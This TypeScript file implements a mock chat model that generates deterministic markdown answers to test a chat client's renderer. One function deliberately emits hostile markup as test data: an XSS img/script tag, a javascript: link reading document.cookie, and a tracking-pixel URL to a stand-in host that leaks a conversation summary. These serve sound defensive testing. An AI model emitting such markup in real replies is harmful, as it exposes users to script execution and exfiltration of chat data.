/**
 * Deterministic chat-answer generation for the mock model.
 *
 * Answers are markdown built from keywords in the latest user message and a
 * phrase bank, so they read like plausible replies, change when the question
 * changes, and exercise the client's renderer: headings, lists, tables, code
 * fences, inline code and links. Asking about HTML, XSS or injection makes
 * the "model" emit hostile markup (raw HTML, a javascript: link, a tracking
 * image), which the client must render inert.
 *
 * The same (model, context, nonce) always yields the same tokens. The
 * executor passes the generation ID as the nonce, so retrying a generation
 * before its first token reproduces the same answer, while a regeneration
 * (a new generation) gets a different one.
 */
import { createHash } from 'node:crypto'
import type { ModelSpec } from '../shared/catalog.js'
import type { ContextMessage } from '../shared/context.js'

export interface GenerateRequest {
  model: string
  messages: ContextMessage[]
  maxTokens: number
  nonce: string
}

export interface GenerationPlan {
  tokens: string[]
  finishReason: 'stop' | 'length'
  /** Index of the token after which an error event is sent, or null. */
  failAfterToken: number | null
  /** Index of the token after which the connection is dropped silently, or null. */
  disconnectAfterToken: number | null
}

const STOPWORDS = new Set(
  `a an and are as at be but by for from has have how i if in into is it its of on or our so that the
  their them then there these this those to was we what when where which who why will with you your
  please write give make explain describe using use about can should would could me my any all each
  more most some such than too very just also only own same other over under again further once does
  do did want need help tell show like get got know think thanks thank okay yes no now let lets it's i'm`
    .split(/\s+/)
    .filter(Boolean),
)

const FALLBACK = ['the question', 'the context']

const OPENINGS = [
  'Good question. The short version: **{k}** is the part that decides most of this.',
  'Here is how I would think about **{k}**.',
  'Let me break **{k}** down into the pieces that matter.',
  'There are a few ways to approach **{k}**, and the right one depends on {k2}.',
]

const FOLLOW_OPENINGS = [
  'Building on what we said about **{p}**, here is how **{k}** fits in.',
  'Picking up from **{p}**: the next thing to settle is **{k}**.',
]

const SENTENCES = [
  'The most important detail is {k}, because it shapes everything downstream.',
  'Start by writing down what "done" looks like for {k}; it keeps the rest honest.',
  'Treat {k} as the primary constraint and {k2} as something you can adjust later.',
  'If {k} changes, revisit the assumptions behind {k2} before going further.',
  'A common mistake is to optimize {k2} before {k} is settled.',
  'For {k}, one small concrete example usually teaches more than a general rule.',
  'The risk with {k2} is that it hides problems in {k} until late.',
  'Measure {k} before and after, so the effect of the change is obvious.',
  'It helps to separate what you know about {k} from what you are assuming.',
  'When in doubt, pick the simpler option for {k} and keep notes on why.',
]

const BULLETS = [
  'Clarify the scope of **{k}** before committing to an approach.',
  'List the constraints that apply to {k2}.',
  'Try the smallest change that addresses {k}.',
  'Check the result against one real example of {k2}.',
  'Write down open questions about `{k}` for later.',
  'Record the decision and the reason {k} drove it.',
]

const CLOSINGS = [
  'Want me to go deeper on any of these?',
  'I can turn this into a checklist if that is useful.',
  'Happy to adjust the level of detail.',
]

/** Builds the full token sequence for a request. Pure: depends only on its arguments. */
export function planGeneration(
  req: GenerateRequest,
  spec: ModelSpec,
  rates: { failureRate: number; disconnectRate: number },
): GenerationPlan {
  const transcript = req.messages.map((m) => `${m.role}:${m.content}`).join('\u0000')
  const rand = mulberry32(seedFrom([req.model, transcript, req.nonce].join('\u0001')))
  const lastUser = [...req.messages].reverse().find((m) => m.role === 'user')?.content ?? ''
  const earlier = req.messages.slice(0, -1).map((m) => m.content).join(' ')
  const keywords = extractKeywords(lastUser)
  // Only real words from earlier turns: an empty history must not produce "building on the question".
  const previous = earlier.trim() ? extractKeywords(earlier).filter((w) => !keywords.includes(w) && !FALLBACK.includes(w)) : []
  const text = composeAnswer(rand, lastUser, keywords, previous, spec)

  let tokens = tokenize(text)
  let finishReason: GenerationPlan['finishReason'] = 'stop'
  if (tokens.length > req.maxTokens) {
    tokens = tokens.slice(0, req.maxTokens)
    finishReason = 'length'
  }

  // Failures use separate random streams so they never change the text.
  const failRand = mulberry32(seedFrom(`${req.nonce}:fail`))
  const failAfterToken =
    rates.failureRate > 0 && failRand() < rates.failureRate && tokens.length > 4
      ? Math.max(2, Math.floor(tokens.length * (0.2 + failRand() * 0.5)))
      : null
  const dropRand = mulberry32(seedFrom(`${req.nonce}:drop`))
  const disconnectAfterToken =
    failAfterToken === null && rates.disconnectRate > 0 && dropRand() < rates.disconnectRate && tokens.length > 4
      ? Math.max(2, Math.floor(tokens.length * (0.2 + dropRand() * 0.5)))
      : null

  return { tokens, finishReason, failAfterToken, disconnectAfterToken }
}

function composeAnswer(
  rand: () => number,
  question: string,
  kw: string[],
  previous: string[],
  spec: ModelSpec,
): string {
  const q = question.toLowerCase()
  const parts: string[] = []
  const opening =
    previous.length > 0 && rand() < 0.6
      ? fill(pick(rand, FOLLOW_OPENINGS), rand, kw).replace('{p}', previous[0])
      : fill(pick(rand, OPENINGS), rand, kw)
  parts.push(`${opening} ${sentences(rand, kw, 2)}`)

  const wantsUnsafe = /\b(html|xss|inject\w*|script tag|sanitiz\w*)\b/.test(q)
  const wantsCode = /\b(code|function|typescript|javascript|python|script|implement\w*|snippet|regex)\b/.test(q)
  const wantsTable = /\b(table|compare|comparison|versus|vs|trade-?offs?)\b/.test(q)
  const wantsSteps = /\b(steps?|plan|list|how do i|checklist|itinerary)\b/.test(q)
  const thorough = spec.style === 'thorough' || /\b(detailed|in depth|long|essay|thorough)\b/.test(q)

  if (wantsUnsafe) parts.push(unsafeSection(kw))
  if (thorough) parts.push(`## Background\n\n${sentences(rand, kw, 3)}`)
  if (wantsSteps || thorough) {
    const steps = shuffle(rand, BULLETS)
      .slice(0, 3 + Math.floor(rand() * 3))
      .map((s, i) => `${i + 1}. ${fill(s, rand, kw)}`)
      .join('\n')
    parts.push(`${thorough ? '## Steps\n\n' : ''}${steps}`)
  } else {
    const bullets = shuffle(rand, BULLETS)
      .slice(0, 2 + Math.floor(rand() * 3))
      .map((s) => `- ${fill(s, rand, kw)}`)
      .join('\n')
    parts.push(bullets)
  }
  if (wantsTable || (thorough && rand() < 0.6)) parts.push(table(rand, kw))
  if (wantsCode || (thorough && rand() < 0.5)) parts.push(codeBlock(rand, kw, q))
  if (thorough) parts.push(`## Summary\n\n${sentences(rand, kw, 2)}`)
  else parts.push(sentences(rand, kw, 1 + Math.floor(rand() * 2)))
  parts.push(pick(rand, CLOSINGS))
  return parts.join('\n\n')
}

function sentences(rand: () => number, kw: string[], count: number): string {
  return Array.from({ length: count }, () => fill(pick(rand, SENTENCES), rand, kw)).join(' ')
}

function table(rand: () => number, kw: string[]): string {
  const a = kw[0] ?? 'option A'
  const b = kw[1] ?? 'option B'
  const rows = [
    ['Setup effort', pick(rand, ['Low', 'Medium', 'High']), pick(rand, ['Low', 'Medium', 'High'])],
    ['Flexibility', pick(rand, ['Limited', 'Good', 'Excellent']), pick(rand, ['Limited', 'Good', 'Excellent'])],
    ['Best when', `you care most about ${a}`, `${b} matters more`],
  ]
  return [`| Aspect | ${cap(a)} | ${cap(b)} |`, '|---|---|---|', ...rows.map((r) => `| ${r.join(' | ')} |`)].join('\n')
}

function codeBlock(rand: () => number, kw: string[], q: string): string {
  const name = camel(kw[0] ?? 'value')
  const other = camel(kw[1] ?? 'input')
  if (/\bpython\b/.test(q)) {
    return [
      '```python',
      `def summarize_${snake(kw[0] ?? 'items')}(items):`,
      '    """Group items and count each group."""',
      '    counts = {}',
      '    for item in items:',
      `        key = item.get("${snake(kw[1] ?? 'kind')}", "other")`,
      '        counts[key] = counts.get(key, 0) + 1',
      '    return sorted(counts.items(), key=lambda kv: -kv[1])',
      '```',
    ].join('\n')
  }
  const limit = 10 + Math.floor(rand() * 90)
  return [
    '```ts',
    `export function ${name}(${other}: string[], limit = ${limit}): string[] {`,
    `  // Keep the first ${limit} unique entries, preserving order.`,
    '  const seen = new Set<string>()',
    `  for (const entry of ${other}) {`,
    '    if (seen.size >= limit) break',
    '    seen.add(entry.trim())',
    '  }',
    '  return [...seen]',
    '}',
    '```',
  ].join('\n')
}

/** Hostile output a compromised or prompt-injected model could produce. The client must render it inert. */
function unsafeSection(kw: string[]): string {
  return [
    `Here is an example of markup that should never execute when it shows up in a chat about ${kw[0] ?? 'this'}:`,
    '',
    '<img src="x" onerror="alert(\'xss\')"> <script>alert("xss")</script>',
    '',
    'A link that tries to run code: [open the report](javascript:alert(document.cookie)), and a normal one: [MDN on XSS](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting).',
    '',
    '![status badge](https://tracker.example.com/pixel.png?leak=conversation-summary)',
  ].join('\n')
}

export function extractKeywords(text: string): string[] {
  const counts = new Map<string, number>()
  for (const raw of text.toLowerCase().match(/[a-z][a-z0-9-]{2,}/g) ?? []) {
    if (STOPWORDS.has(raw)) continue
    counts.set(raw, (counts.get(raw) ?? 0) + 1)
  }
  const ranked = [...counts.entries()]
    .sort((a, b) => b[1] - a[1] || b[0].length - a[0].length || (a[0] < b[0] ? -1 : 1))
    .map(([word]) => word)
  return ranked.length > 0 ? ranked.slice(0, 8) : FALLBACK
}

function fill(template: string, rand: () => number, kw: string[]): string {
  const k = pick(rand, kw)
  const others = kw.filter((w) => w !== k)
  const k2 = others.length > 0 ? pick(rand, others) : 'the surrounding context'
  return template.replace('{k}', k).replace('{k2}', k2)
}

/** Splits text into word-sized tokens that keep their trailing whitespace, so joining them restores the text. */
export function tokenize(text: string): string[] {
  return text.match(/\S+\s*/g) ?? []
}

const cap = (s: string) => s.charAt(0).toUpperCase() + s.slice(1)
const camel = (s: string) => s.replace(/-([a-z0-9])/g, (_m, c: string) => c.toUpperCase())
const snake = (s: string) => s.replace(/-/g, '_')

function pick<T>(rand: () => number, items: readonly T[]): T {
  return items[Math.floor(rand() * items.length)]
}

function shuffle<T>(rand: () => number, items: readonly T[]): T[] {
  const copy = [...items]
  for (let i = copy.length - 1; i > 0; i--) {
    const j = Math.floor(rand() * (i + 1))
    ;[copy[i], copy[j]] = [copy[j], copy[i]]
  }
  return copy
}

function seedFrom(material: string): number {
  return createHash('sha256').update(material).digest().readUInt32LE(0)
}

function mulberry32(seed: number): () => number {
  let a = seed >>> 0
  return () => {
    a = (a + 0x6d2b79f5) >>> 0
    let t = a
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}
